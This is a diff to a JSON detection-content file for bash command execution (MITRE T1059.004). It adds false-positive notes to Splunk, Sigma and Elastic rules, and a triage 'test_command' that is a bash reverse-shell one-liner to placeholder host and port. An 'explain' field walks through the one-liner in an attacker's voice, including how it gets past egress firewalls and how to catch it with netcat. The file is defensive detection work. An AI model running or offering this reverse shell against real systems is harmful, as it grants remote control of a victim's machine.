@@ -113,7 +113,8 @@
           "T1059.004"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -127,7 +128,8 @@
         "confidence": "medium",
         "log_ids": [
           "1"
-        ]
+        ],
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -141,7 +143,8 @@
         "confidence": "medium",
         "log_ids": [
           "3"
-        ]
+        ],
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "sigma",
@@ -152,7 +155,8 @@
           "T1059.004"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate remote management tools with reverse connection patterns"
       },
       {
         "platform": "elastic",
@@ -162,7 +166,9 @@
         "attack": [
           "T1059.004"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Legitimate remote management tools with reverse connection patterns",
+        "confidence": "medium"
       }
     ],
     "visibility": {
@@ -198,7 +204,8 @@
         "Review PowerShell Script Block / Module Logs, Sysmon for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'"
     }
   },
   "explain": "Reverse-shell payload run on the target to call back to your listener:\n  bash -c '...'                 run the one-liner in bash\n  bash -i                       start an interactive shell\n  >& /dev/tcp/<lhost>/<lport>   redirect it over a TCP socket to your host/port\n  0>&1                          wire stdin back through the same socket\nThe victim initiates the outbound connection, which usually gets past egress firewall rules; catch it with a netcat listener."
